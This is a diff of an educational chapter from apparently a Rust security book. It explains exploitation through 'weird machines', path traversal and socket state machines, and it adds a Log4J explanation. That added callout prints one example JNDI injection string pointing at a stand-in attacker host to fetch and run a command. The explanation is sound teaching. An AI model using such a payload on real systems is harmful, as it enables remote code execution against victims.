@@ -44,7 +44,7 @@ They *degrade confidence significantly* for *both* the above assurance criteria.
 > But is it actually true?
 > How exactly, in terms of concrete implementation, can a programmer achieve those high assurance properties?
 > What context, limitations, and insights underpin this goal?
-> More importantly, can we combine Rust with other open-source tools to push the assurance level *even higher*?
+> More importantly, can we combine Rust with other open-source tools, industry best practices, and research findings to push the assurance level *even higher*?
 
 ## Building a Mental Framework for Exploitation
 
@@ -66,7 +66,7 @@ In the context of binary exploitation, we can think of exploits as malicious beh
 
 For exploitation generally, outside of memory safety violations, there may be no subset relation. Perhaps the malicious set only intersects the UB set and the actual set (three overlapping circles, without two concentric).
 
-  * Example exploit: **path/directory traversal**[^DirTrav]. In a client-server context, returning a file by path is defined, intended behavior. But a sensitive file is exposed to a less-trusted client - we may have a critical vulnerability.
+  * Example exploit: **path/directory traversal**[^DirTrav]. In a client-server context, returning a file by path is defined, intended behavior. But if a sensitive file is exposed to a less-trusted client - we may have a critical vulnerability. Especially if the client can write the file.
 
 What is a path traversal attack, exactly?
 OWASP offers a clear definition[^DirTrav], excerpt:
@@ -121,7 +121,8 @@ This standard interface describes sockets as having five states:
 4. **Open** - ready to send and receive data (stays in this state while actually transmitting).
 5. **Closed** - no longer active, the session has ended.
 
-Visually, we can represent a server's socket as the below Finite State Machine (FSM):
+Visually, we can represent a server's socket as the below Finite State Machine (FSM).
+We assume it encodes **Actual Behavior**.
 
 </br>
 <p align="center">
@@ -167,13 +168,18 @@ A 2nd, malicious, shadow-machine is always present just beneath the surface.
 Just waiting to be activated, to emerge.
 In any non-ideal program.
 
-Visually, we transition to the weird machine from the normal machine's "Open" state if an exploit payload is received by the server:
+Visually, we transition to the weird machine from the normal machine's "Open" state if an exploit payload is received by the server.
+Recall we assumed **Actual Behavior** - in reality that means overlap with two other families of behaviors:
+
+* The vulnerable header field parsing happened in the open state. This state introduced **Undefined Behavior (UB)**.
+
+* An attacker leveraged UB to craft an exploit. Programming their own **Malicious Behavior** finite state machine.
 
 </br>
 <p align="center">
   <img width="100%" src="socket_weird_machine.svg">
   <figure>
-  <figcaption><center>Weird machine programmed via remote exploit payload.</center></figcaption><br>
+  <figcaption><center>Weird machine ("Attacker FSM") programmed via remote exploit payload against normal machine ("Programmer FSM").</center></figcaption><br>
   </figure>
 </p>
 
@@ -190,9 +196,31 @@ For readers wanting a formal proof, Dullien further solidifies the weird machine
 
     * We do not attempt to prove non-exploitability for any programs in this book. Regardless - this is a powerful idea significant to our understanding computer security as a science.
 
-2. He demonstrates the exploitability (proof-by-counterexample) of different implementation of that same theoretical program *without* altering control flow.
+2. He demonstrates the exploitability (proof-by-counterexample) of a different implementation of that same theoretical program *without* altering control flow.
 
     * We won't demonstrate any exploit maintaining perfect control flow integrity in this book. Just know that "data-oriented attacks" are possible (even if uncommon) examples of weird machine programming.
+
+> **Weird Machines are Universal**
+>
+> There's more than one way to skin a ~~cat~~ state machine.
+> We contextualized the above diagram within binary exploitation, but it would accurately represent memory-safe command injection.
+> In fact, Java's Log4J CVE-2021-44228[^Log4J] enables a stable, widely applicable weird machine with similar Remote Code Execution (RCE) semantics.
+>
+> At a high-level, Log4J exploitation works like this[^ComputerphileLog4J]:
+>
+> * Production-grade software leverages logging frameworks to aid with error diagnosis, anomaly detection, and system monitoring. Apache Log4j is a leading logging library for Java, so it's nearly ubiquitous in-the-wild.
+>
+> * Log4j supports a macro-like syntax for meta-programming of log messages. For example, the string `${java:version}` would be expanded and logged as `Java version X.Y.Z_XYZ` - fingerprinting the host's currently installed Java software.
+>
+> * Many log sites in a codebase write external, attacker-controlled values directly into the logged string. A host's User Agent is one example, since it can be configured. Coupled with expansion/meta-programming, we lose a **non-repudiation** property - the attacker controls log message contents and can falsify data to cover their tracks.
+>
+> * It gets worse: we also lose all assurance as well. As of 2013, Log4j offers integration with the Java Naming and Directory Interface (JNDI). This functionality, intended for remote lookups, allows fetching and running Java classes from a remote server. If an attacker can get a string like `${jndi:ldap://evildomain.net:1337/Basic/Command/Base64/SOME_BASE64_CMD}` into a log, the victim's host will connect to an attacker-controlled server, fetch an arbitrary malicious command, and execute it locally.
+>
+> In this example of command injection, the weird machine is programmed with a specially crafted string addressing an attacker-controlled server.
+> Untrusted log data becomes code executed with the privileges of the victim process.
+>
+> The vulnerability is not a memory safety violation, it's a configuration flaw: an unintended composition of esoteric features that should have been disabled by default.
+> It could have happened within a Rust logging library, if one offered an equivalent feature set that likewise wasn't securely designed.
 
 ## Takeaway
 
@@ -211,9 +239,13 @@ In practice, a defender cannot eliminate weird machines entirely.
 From an computability perspective, turing-completeness[^TuringComplete] gives the attacker a significant advantage.
 
 Defenders strive to reduce and/or detect possible transitions out of the normal states and into the weird ones.
-Strongly-enforced memory and type-safety eliminate *a lot* of possible transitions to malicious states.
+Strongly-enforced memory and type-safety eliminate *a great deal* of possible transitions to malicious states.
 
 With that high-level conceptualization in mind, let's learn our way around a debugger and start dabbling in weird machine development ourselves.
+
+<!--
+In the next section, we'll put these concepts into play hands-on to reduce secret exposure on an untrusted host.
+-->
 
 ---
 
@@ -237,10 +269,14 @@ With that high-level conceptualization in mind, let's learn our way around a deb
 
 [^WeirdMachine]: [*Exploit Programming: From Buffer Overflows to "Weird Machines" and Theory of Computation*](https://www.usenix.org/system/files/login/articles/105516-Bratus.pdf). Sergey Bratus, Michael Locasto, Meredith Patterson, Len Sassaman, and Aanna Shubina (2011).
 
-[^IFSM]: What we call the "normal machine" is what Dullien[^FormalWeirdness] refers to as the *Intended Finite State Machine (IFSM).* We can think of any software program as an *approximation* of an abstract IFSM (here, the states of an ideal POSIX web server) emulated atop a CPU's low-level FSM (as specified by the architecture spec). "Approximation" because programs have bugs. The subset of bugs which are vulnerabilities allow breaking out of IFSM states and into emergent, weird FSM states.
+[^IFSM]: What we call the "normal machine" is what Dullien[^FormalWeirdness] refers to as the *Intended Finite State Machine (IFSM).* We can think of any software program as an *approximation* of an abstract IFSM (here, the states of an ideal POSIX web server) emulated atop a CPU's low-level FSM (as specified by architecture manuals). "Approximation" because programs have bugs. The subset of bugs which are vulnerabilities allow breaking out of IFSM states and into emergent, weird FSM states.
 
 [^PosixSock]: [*Berkeley sockets*](https://en.wikipedia.org/wiki/Berkeley_sockets). Wikipedia (Accessed 2022).
 
 [^FormalWeirdness]: [*Weird Machines, Exploitability, and Provable Unexploitability*](https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=8226852). Thomas Dullien (2017).
 
 [^TuringComplete]: [*Turing Completeness*](https://en.wikipedia.org/wiki/Turing_completeness). Wikipedia (Accessed 2022).
+
+[^Log4J]: [*Apache Log4j Vulnerability Guidance*](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance). CISA (2021).
+
+[^ComputerphileLog4J]:  [*Log4J & JNDI Exploit: Why So Bad?*](https://www.youtube.com/watch?v=Opqgwn8TdlM). Computerphile (2021).
